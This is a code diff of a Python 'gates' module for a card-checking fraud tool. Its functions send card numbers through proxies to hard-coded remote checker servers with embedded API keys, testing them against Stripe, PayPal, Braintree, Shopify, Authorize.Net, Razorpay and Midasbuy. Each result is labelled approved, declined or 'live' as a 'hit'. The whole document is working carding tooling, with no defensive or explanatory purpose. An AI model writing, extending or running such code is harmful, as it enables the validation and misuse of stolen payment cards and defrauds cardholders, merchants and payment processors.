@@ -1,5 +1,10 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
+"""
+Gates module – all checker functions.
+Each function accepts (cc, proxy=None) and returns (message, status).
+Status: 'APPROVED', 'DECLINED', 'ERROR', 'APPROVED_OTP'
+"""
 
 import requests
 import json
@@ -8,7 +13,6 @@ import random
 import base64
 import time
 import urllib3
-import logging
 import hashlib
 from functools import wraps
 
@@ -17,13 +21,13 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 # ============================================================================
 # API ENDPOINTS
 # ============================================================================
-SHOPIFY_API_ENDPOINT = "http://187.127.134.227:5000/shopify"
-CARD_API_BASE        = "http://2.25.156.218:5001"   # for Stripe Charge, PayPal, VBV, Braintree
-RAZORPAY_API_URL     = "http://2.25.156.218:5000/check"
+SHOPIFY_API_ENDPOINT = "http://2.25.156.218:8080/shopify"   # Shopify checker
+CARD_API_BASE        = "http://2.25.156.218:5001"          # Stripe, PayPal, VBV, Braintree
+RAZORPAY_API_URL     = "http://2.25.156.218:5000/check"    # Razorpay
 RAZORPAY_API_KEY     = "Novaop"
 
 # ============================================================================
-# DECORATORS (only kept on direct‑play gates)
+# DECORATOR: Retry on proxy/connection errors
 # ============================================================================
 def with_retries(max_attempts=3):
     def decorator(func):
@@ -41,8 +45,7 @@ def with_retries(max_attempts=3):
                                 "server disconnected", "timeout", "connection refused",
                                 "failed to get session token", "site error! status: 402",
                                 "error processing card", "api error", "not shopify",
-                                "proxy error: 503", "remote end closed",
-                                "could not connect", "no route to host",
+                                "remote end closed", "could not connect", "no route to host",
                                 "unable to reach the checker"
                             ]
                             if any(kw in msg.lower() for kw in error_keywords):
@@ -61,15 +64,24 @@ def with_retries(max_attempts=3):
     return decorator
 
 # ============================================================================
-# CORE SELF‑API CALLER (for Stripe Charge, PayPal, VBV, Braintree) – 60s timeout
+# PROXY NORMALISATION
 # ============================================================================
-def _call_self_api(endpoint, cc, proxies=None):
+def normalise_proxy(proxy):
+    """Convert proxy string to http:// format for requests."""
+    if not proxy:
+        return None
+    if proxy.startswith('http://') or proxy.startswith('https://'):
+        return proxy
+    return f'http://{proxy}'
+
+# ============================================================================
+# CORE API CALLER (for Stripe, PayPal, VBV, Braintree)
+# ============================================================================
+def _call_self_api(endpoint, cc, proxy=None):
+    """Generic caller for the self‑hosted API (port 5001)."""
     params = {'cc': cc}
-    if proxies:
-        if isinstance(proxies, (list, tuple)):
-            params['proxy'] = ','.join(proxies)
-        else:
-            params['proxy'] = proxies
+    if proxy:
+        params['proxy'] = proxy
 
     url = f"{CARD_API_BASE}/{endpoint}"
     headers = {"X-API-Key": "novaop"}
@@ -83,26 +95,23 @@ def _call_self_api(endpoint, cc, proxies=None):
         raw_msg    = data.get('message', 'Unknown')
 
         if is_success:
-            if 'LIVE' in raw_msg.upper() or '3DS' in raw_msg.upper() or 'CVV' in raw_msg.upper():
-                status = 'APPROVED'
-            else:
-                status = 'APPROVED'
+            return raw_msg, "APPROVED"
         else:
-            status = 'DECLINED'
+            return raw_msg, "DECLINED"
 
-        return raw_msg, status
-
-    except Exception:
-        return "API Error: Unable to reach the checker", "ERROR"
+    except Exception as e:
+        return f"API Error: {str(e)[:80]}", "ERROR"
 
 # ============================================================================
-# STRIPE AUTH (B3) – DIRECT CALL, 60s TIMEOUT
+# STRIPE AUTH (B3)
 # ============================================================================
 def check_stripe_auth(cc, proxy=None):
-    """Stripe Auth using the new self‑hosted API (port 5001)."""
+    """Stripe Auth (0$ check) via /stripe_auth endpoint."""
     url = f"{CARD_API_BASE}/stripe_auth"
     headers = {"X-API-Key": "novaop"}
     params = {'cc': cc}
+    if proxy:
+        params['proxy'] = proxy
 
     try:
         resp = requests.get(url, params=params, headers=headers, timeout=60, verify=False)
@@ -119,43 +128,43 @@ def check_stripe_auth(cc, proxy=None):
                 return raw_msg, "DECLINED"
             return raw_msg, "DECLINED"
     except Exception as e:
-        return f"Stripe Auth error: {str(e)}", "ERROR"
+        return f"Stripe Auth error: {str(e)[:80]}", "ERROR"
 
 # ============================================================================
-# STRIPE CHARGE – 60s via _call_self_api
+# STRIPE CHARGE
 # ============================================================================
 def check_stripe_charge(cc, proxy=None):
-    return _call_self_api('stripe_charge', cc, proxies=proxy)
+    return _call_self_api('stripe_charge', cc, proxy)
 
 # ============================================================================
-# PAYPAL – 60s via _call_self_api
+# PAYPAL
 # ============================================================================
 def check_paypal(cc, proxy=None):
-    raw_msg, api_status = _call_self_api('paypal', cc, proxies=proxy)
+    raw_msg, status = _call_self_api('paypal', cc, proxy)
     if "LIVE" in raw_msg.upper() or "CHARGED" in raw_msg.upper():
         return raw_msg, "APPROVED"
-    return raw_msg, api_status
+    return raw_msg, status
 
 check_paypal_charge = check_paypal
 check_paypal_donate = check_paypal
-check_paypal_fixed   = check_paypal
+check_paypal_fixed  = check_paypal
 check_paypal_general = check_paypal
-check_paypal_onyx    = check_paypal
+check_paypal_onyx   = check_paypal
 
 # ============================================================================
-# VBV / 3DS – 60s via _call_self_api
+# VBV / 3DS LOOKUP
 # ============================================================================
 def check_vbv_lookup(cc, proxy=None):
-    return _call_self_api('vbv_lookup', cc, proxies=proxy)
+    return _call_self_api('vbv_lookup', cc, proxy)
 
 # ============================================================================
-# BRAINTREE AUTH – 60s via _call_self_api
+# BRAINTREE AUTH (API)
 # ============================================================================
 def check_braintree_api(cc, proxy=None):
-    return _call_self_api('braintree_auth', cc, proxies=proxy)
+    return _call_self_api('braintree_auth', cc, proxy)
 
 # ============================================================================
-# BRAINTREE B3 (direct) – kept retries, internal requests 15s each
+# BRAINTREE B3 (DIRECT)
 # ============================================================================
 @with_retries(max_attempts=3)
 def check_braintree_b3(cc, proxy=None):
@@ -232,73 +241,110 @@ def check_braintree_b3(cc, proxy=None):
         return f"Braintree error: {str(e)[:80]}", "ERROR"
 
 # ============================================================================
-# SHOPIFY API – 60s
+# SHOPIFY API – UPDATED WITH DIRECT STATUS PARSING
 # ============================================================================
 def check_shopify_api(site_url, cc, proxy=None):
+    """
+    Calls the Shopify checker API and returns a dict with:
+      - Response: the error message (if any) or the status string
+      - status:   'APPROVED', 'DECLINED', 'ERROR', 'APPROVED_OTP'
+      - gateway, price, site
+      - raw_response: the raw message from the API (for better classification)
+    """
     params = {'site': site_url, 'cc': cc}
     if proxy:
         params['proxy'] = proxy
     try:
-        resp = requests.get(SHOPIFY_API_ENDPOINT, params=params, timeout=60, verify=False)
+        resp = requests.get(SHOPIFY_API_ENDPOINT, params=params, timeout=120, verify=False)
         resp.raise_for_status()
         data = resp.json()
-        msg = data.get('Response', 'Unknown')
-        gateway = data.get('Gateway', 'Shopify Payments')
-        price = str(data.get('Price', '0.00'))
-        api_status = data.get('Status', False)
-        msg_upper = msg.upper()
-        DECLINE_KEYWORDS = [
-            'PROCESSING_ERROR', 'PAYMENTS_CREDIT_CARD_BRAND_NOT_SUPPORTED',
-            'PAYMENTS_CREDIT_CARD_GENERIC', 'GENERIC_DECLINE',
-            'DO_NOT_HONOR', 'INSUFFICIENT_FUNDS', 'CARD_DECLINED',
-            'FRAUD_SUSPECTED', 'INCORRECT_CVC', 'INCORRECT_ZIP',
-            'EXPIRED_CARD', 'INVALID_ACCOUNT', 'RESTRICTED_CARD',
-            'LOST_CARD', 'STOLEN_CARD', 'PICKUP_CARD'
-        ]
-        if any(kw in msg_upper for kw in DECLINE_KEYWORDS):
-            return {
-                'Response': msg,
-                'status': 'DECLINED',
-                'gateway': gateway,
-                'price': price,
-                'site': site_url
-            }
-        if 'ORDER_PLACED' in msg_upper or 'APPROVED' in msg_upper:
-            status = 'APPROVED'
-        elif 'OTP' in msg_upper or '3D' in msg_upper:
-            status = 'APPROVED_OTP'
-        elif 'DECLINED' in msg_upper:
-            status = 'DECLINED'
-        elif not api_status:
-            status = 'ERROR'
+
+        raw_status = data.get('status', 'Unknown')
+        error_msg = data.get('error', '')
+        gateway = data.get('gateway', 'Shopify Payments')
+        price = str(data.get('amount', '0.00'))
+        api_success = data.get('success', False)
+
+        # Build the response message
+        if error_msg:
+            response_msg = error_msg
         else:
-            status = 'DECLINED'
+            response_msg = raw_status
+
+        # ---- Determine status (raw, will be refined later) ----
+        if api_success:
+            if 'ORDER_PLACED' in raw_status.upper() or 'CHARGED' in raw_status.upper():
+                final_status = 'APPROVED'
+            elif '3DS' in raw_status.upper() or 'OTP' in raw_status.upper() or 'AUTHENTICATION' in raw_status.upper():
+                final_status = 'APPROVED_OTP'
+            elif 'INSUFFICIENT' in raw_status.upper():
+                final_status = 'APPROVED'
+            else:
+                final_status = 'APPROVED'
+        else:
+            # We will do detailed mapping later, but set a provisional status
+            final_status = 'DECLINED'  # default to declined if not a clear error
+
         return {
-            'Response': msg,
-            'status': status,
+            'Response': response_msg,
+            'status': final_status,
             'gateway': gateway,
             'price': price,
-            'site': site_url
+            'site': site_url,
+            'raw_response': response_msg  # <-- added
         }
-    except Exception:
+    except Exception as e:
         return {
-            'Response': 'API Error',
+            'Response': f'API Error: {str(e)[:80]}',
             'status': 'ERROR',
             'gateway': 'Shopify',
             'price': '0.00',
-            'site': site_url
+            'site': site_url,
+            'raw_response': str(e)
         }
 
 def process_shopify_api_response(api_response, site_price='0.00'):
+    """
+    Extract (message, status, gateway) from the Shopify API response.
+    Maps all known decline reasons to DECLINED.
+    """
     if not api_response or not isinstance(api_response, dict):
         return "System Error", "ERROR", "Shopify Payments"
+
     msg = api_response.get('Response', 'Unknown')
+    raw = api_response.get('raw_response', msg)  # fallback
     status = api_response.get('status', 'ERROR')
     gateway = api_response.get('gateway', 'Shopify Payments')
+
+    # ---- If status is already ERROR, check if it's actually a decline ----
+    if status == 'ERROR':
+        # Known decline reasons (from Shopify error codes)
+        decline_keywords = [
+            'DECLINED', 'CARD_DECLINED', 'INSTRUMENT_DECLINED',
+            'DO_NOT_HONOR', 'CALL_ISSUER', 'PICK_UP_CARD',
+            'INCORRECT_NUMBER', 'INCORRECT_CVC', 'INCORRECT_ZIP',
+            'INCORRECT_ADDRESS', 'INCORRECT_PIN',
+            'INVALID_AMOUNT', 'INVALID_CURRENCY',
+            'FRAUD_SUSPECTED', 'HIGH_RISK_FRAUD_SUSPECTED',
+            'CARD_TESTING', 'AUTHENTICATION_FAILED',
+            'EXPIRED_CARD', 'EXPIRED_SESSION',
+        ]
+        msg_upper = raw.upper()
+        if any(kw in msg_upper for kw in decline_keywords):
+            status = 'DECLINED'
+
+    # If it's APPROVED_OTP, we keep it (but it's still a live response)
+    if status == 'APPROVED_OTP':
+        # This is an approved status – we treat as APPROVED for hit purposes
+        # but you can keep it separate if needed
+        pass
+
+    # If status is not ERROR or DECLINED, it's already fine.
+
     return msg, status, gateway
 
 # ============================================================================
-# AUTHORIZE.NET – internal requests 60s
+# AUTHORIZE.NET
 # ============================================================================
 @with_retries(max_attempts=3)
 def check_authorize_net(cc, proxy=None):
@@ -380,7 +426,7 @@ def check_authorize_net(cc, proxy=None):
         return f"Authorize.Net error: {str(e)[:80]}", "ERROR"
 
 # ============================================================================
-# RAZORPAY – 60s
+# RAZORPAY
 # ============================================================================
 def check_razorpay(cc, proxy=None, site=None):
     if not site:
@@ -413,7 +459,7 @@ def check_razorpay(cc, proxy=None, site=None):
 check_razorpay_api = check_razorpay
 
 # ============================================================================
-# MIDASBUY – 60s
+# MIDASBUY
 # ============================================================================
 MIDASBUY_API = "http://72.62.16.52:8080/check"
 
@@ -442,17 +488,7 @@ def check_midasbuy(cc, proxy=None):
         return f"Midasbuy Error: {str(e)[:60]}", "ERROR"
 
 # ============================================================================
-# PROXY NORMALISATION
-# ============================================================================
-def normalise_proxy(proxy):
-    if not proxy:
-        return None
-    if proxy.startswith('http://') or proxy.startswith('https://'):
-        return proxy
-    return f'http://{proxy}'
-
-# ============================================================================
-# ALIASES
+# ALIASES (for compatibility)
 # ============================================================================
 check_stripe_api = check_stripe_charge
 check_b3_auth    = check_stripe_auth
